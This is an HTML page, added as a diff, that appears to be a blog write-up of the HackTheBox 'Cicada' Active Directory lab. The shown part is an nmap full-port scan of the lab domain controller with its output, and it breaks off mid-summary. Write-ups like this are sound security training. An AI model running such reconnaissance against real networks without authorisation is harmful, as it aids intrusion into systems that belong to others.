@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Cicada - HackTheBox Writeup | keyll0ger</title>
+<meta name="keywords" content="HTB, Windows, Easy, Active Directory">
+<meta name="description" content="Nmap Full Scan ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada] └─$ nmap -sV -sC -p- -vv 10.10.11.35 -oN cicada.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 21:22 CET NSE: Loaded 156 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan.">
+<meta name="author" content="keyll0ger">
+<link rel="canonical" href="https://keyll0ger.github.io/posts/cicada/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://keyll0ger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://keyll0ger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://keyll0ger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://keyll0ger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://keyll0ger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://keyll0ger.github.io/posts/cicada/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="Cicada - HackTheBox Writeup" />
+<meta property="og:description" content="Nmap Full Scan ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada] └─$ nmap -sV -sC -p- -vv 10.10.11.35 -oN cicada.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 21:22 CET NSE: Loaded 156 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keyll0ger.github.io/posts/cicada/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2026-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cicada - HackTheBox Writeup"/>
+<meta name="twitter:description" content="Nmap Full Scan ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada] └─$ nmap -sV -sC -p- -vv 10.10.11.35 -oN cicada.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 21:22 CET NSE: Loaded 156 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://keyll0ger.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Cicada - HackTheBox Writeup",
+      "item": "https://keyll0ger.github.io/posts/cicada/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Cicada - HackTheBox Writeup",
+  "name": "Cicada - HackTheBox Writeup",
+  "description": "Nmap Full Scan ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada] └─$ nmap -sV -sC -p- -vv 10.10.11.35 -oN cicada.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 21:22 CET NSE: Loaded 156 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan.",
+  "keywords": [
+    "HTB", "Windows", "Easy", "Active Directory"
+  ],
+  "articleBody": " Nmap Full Scan ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada] └─$ nmap -sV -sC -p- -vv 10.10.11.35 -oN cicada.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 21:22 CET NSE: Loaded 156 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed Initiating Ping Scan at 21:22 Scanning 10.10.11.35 [4 ports] Completed Ping Scan at 21:22, 0.06s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:22 Completed Parallel DNS resolution of 1 host. at 21:22, 0.00s elapsed Initiating SYN Stealth Scan at 21:22 Scanning 10.10.11.35 [65535 ports] Discovered open port 53/tcp on 10.10.11.35 Discovered open port 135/tcp on 10.10.11.35 Discovered open port 445/tcp on 10.10.11.35 Discovered open port 139/tcp on 10.10.11.35 Discovered open port 3269/tcp on 10.10.11.35 SYN Stealth Scan Timing: About 14.88% done; ETC: 21:26 (0:02:57 remaining) SYN Stealth Scan Timing: About 33.72% done; ETC: 21:25 (0:02:00 remaining) Discovered open port 593/tcp on 10.10.11.35 Discovered open port 88/tcp on 10.10.11.35 Discovered open port 62424/tcp on 10.10.11.35 Discovered open port 5985/tcp on 10.10.11.35 Discovered open port 389/tcp on 10.10.11.35 SYN Stealth Scan Timing: About 48.20% done; ETC: 21:25 (0:01:44 remaining) Discovered open port 464/tcp on 10.10.11.35 SYN Stealth Scan Timing: About 64.99% done; ETC: 21:25 (0:01:08 remaining) Discovered open port 3268/tcp on 10.10.11.35 SYN Stealth Scan Timing: About 80.07% done; ETC: 21:25 (0:00:39 remaining) Discovered open port 636/tcp on 10.10.11.35 Completed SYN Stealth Scan at 21:25, 197.41s elapsed (65535 total ports) Initiating Service scan at 21:25 Scanning 13 services on 10.10.11.35 Completed Service scan at 21:26, 54.01s elapsed (13 services on 1 host) NSE: Script scanning 10.10.11.35. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:26 Stats: 0:04:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE: Active NSE Script Threads: 1 (1 waiting) NSE Timing: About 99.94% done; ETC: 21:26 (0:00:00 remaining) Completed NSE at 21:27, 40.06s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:27 Completed NSE at 21:27, 1.57s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 21:27 Completed NSE at 21:27, 0.00s elapsed Nmap scan report for 10.10.11.35 Host is up, received echo-reply ttl 127 (0.027s latency). Scanned at 2025-01-25 21:22:32 CET for 293s Not shown: 65522 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-26 03:25:56Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:CICADA-DC.cicada.htb | Issuer: commonName=CICADA-DC-CA/domainComponent=cicada | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-22T20:24:16 | Not valid after: 2025-08-22T20:24:16 | MD5: 9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65 | SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a | -----BEGIN CERTIFICATE----- | MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF | ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh | MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy | MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ | KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8 | BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua | NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc | Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x | o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy | 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC | Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A | bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/ | BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3 | DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL | BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7 | Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp | MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D | QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz | LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j | ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz | dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB | nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl | MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk | YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj | YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi | HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD | ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE | eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb | xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz | obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT | P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF | ji6zxYOoOznp6JlmbakLb1ZRLA8= |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:CICADA-DC.cicada.htb | Issuer: commonName=CICADA-DC-CA/domainComponent=cicada | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-22T20:24:16 | Not valid after: 2025-08-22T20:24:16 | MD5: 9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65 | SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a | -----BEGIN CERTIFICATE----- | MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF | ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh | MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy | MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ | KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8 | BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua | NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc | Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x | o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy | 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC | Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A | bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/ | BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3 | DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL | BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7 | Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp | MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D | QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz | LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j | ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz | dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB | nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl | MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk | YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj | YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi | HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD | ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE | eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb | xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz | obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT | P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF | ji6zxYOoOznp6JlmbakLb1ZRLA8= |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:CICADA-DC.cicada.htb | Issuer: commonName=CICADA-DC-CA/domainComponent=cicada | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-22T20:24:16 | Not valid after: 2025-08-22T20:24:16 | MD5: 9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65 | SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a | -----BEGIN CERTIFICATE----- | MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF | ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh | MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy | MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ | KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8 | BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua | NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc | Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x | o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy | 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC | Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A | bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/ | BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3 | DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL | BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7 | Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp | MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D | QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz | LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j | ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz | dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB | nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl | MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk | YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj | YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi | HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD | ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE | eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb | xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz | obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT | P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF | ji6zxYOoOznp6JlmbakLb1ZRLA8= |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:CICADA-DC.cicada.htb | Issuer: commonName=CICADA-DC-CA/domainComponent=cicada | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-08-22T20:24:16 | Not valid after: 2025-08-22T20:24:16 | MD5: 9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65 | SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a | -----BEGIN CERTIFICATE----- | MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF | ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh | MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy | MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ | KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8 | BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua | NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc | Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x | o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy | 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC | Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A | bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/ | BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3 | DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL | BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7 | Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp | MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D | QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz | LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j | ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz | dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB | nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl | MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk | YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj | YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi | HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD | ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE | eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb | xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz | obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT | P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF | ji6zxYOoOznp6JlmbakLb1ZRLA8= |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 62424/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 6h59m59s | smb2-time: | date: 2025-01-26T03:26:49 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 43674/tcp): CLEAN (Timeout) | Check 2 (port 38244/tcp): CLEAN (Timeout) | Check 3 (port 62917/udp): CLEAN (Timeout) | Check 4 (port 61453/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:27 Completed NSE at 21:27, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:27 Completed NSE at 21:27, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 21:27 Completed NSE at 21:27, 0.00s elapsed Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 293.43 seconds Raw packets sent: 131207 (5.773MB) | Rcvd: 151 (6.628KB) Nmap Scan Report for 10.10.11.35 Scan Initiated: 2025-01-25 21:22 CET\nScan Duration: 293 seconds\nHost Status: Up (echo-reply ttl 127, 0.027s latency)\nOpen Ports The following ports were found open:\nPort Service Version 53/tcp domain Simple DNS Plus 88/tcp kerberos-sec Microsoft Windows Kerberos 135/tcp msrpc Microsoft Windows RPC 139/tcp netbios-ssn Microsoft Windows netbios-ssn 389/tcp ldap Microsoft Windows Active Directory LDAP 445/tcp microsoft-ds Unknown 464/tcp kpasswd5 Unknown 593/tcp ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp ssl/ldap Microsoft Windows Active Directory LDAP 3268/tcp ldap Microsoft Windows Active Directory LDAP 3269/tcp ssl/ldap Microsoft Windows Active Directory LDAP SSL Certificates Common Name: CICADA-DC.cicada.htb Issuer: CICADA-DC-CA/domainComponent=cicada Public Key Type: RSA Public Key Bits: 2048 Valid From: 2024-08-22 20:24:16 Valid Until: 2025-08-22 20:24:16 SHA-1 Fingerprint: 